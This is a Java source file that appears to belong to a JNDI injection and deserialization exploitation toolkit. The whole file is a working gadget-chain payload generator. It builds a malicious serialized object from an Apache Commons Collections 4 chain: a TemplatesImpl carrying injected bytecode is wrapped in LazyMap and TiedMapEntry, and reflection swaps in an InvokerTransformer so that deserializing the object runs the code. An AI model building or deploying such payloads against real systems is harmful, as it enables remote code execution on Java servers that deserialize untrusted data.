package com.qi4l.jndi.gadgets;

import com.qi4l.jndi.enumtypes.PayloadType;
import com.qi4l.jndi.gadgets.annotation.Dependencies;
import com.qi4l.jndi.gadgets.utils.Gadgets;
import com.qi4l.jndi.gadgets.utils.GadgetsYso;
import com.qi4l.jndi.gadgets.utils.Reflections;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.keyvalue.TiedMapEntry;
import org.apache.commons.collections4.map.LazyMap;

import java.util.HashMap;
import java.util.Map;

import static com.qi4l.jndi.Starter.JYsoMode;

@Dependencies({"commons-collections:commons-collections:4.0"})
public class commonscollectionsk6 implements ObjectPayload<Object> {

    @Override
    public Object getObject(PayloadType type, String... param) throws Exception {
        final Object templates;
        if (JYsoMode.contains("yso")) {
            templates = GadgetsYso.createTemplatesImpl(param[0]);
        } else {
            templates = Gadgets.createTemplatesImpl(type, param);
        }
        InvokerTransformer      invokerTransformer = new InvokerTransformer("connect", null, null);
        HashMap<Object, Object> map                = new HashMap<>();
        Map<Object, Object>     lazyMap            = LazyMap.lazyMap(map, new ConstantTransformer(1));
        TiedMapEntry            tiedMapEntry       = new TiedMapEntry(lazyMap, templates);

        HashMap<Object, Object> expMap = new HashMap<>();
        expMap.put(tiedMapEntry, "QI4L");
        lazyMap.remove(templates);

        Reflections.setFieldValue(lazyMap, "factory", invokerTransformer);

        return expMap;
    }
}
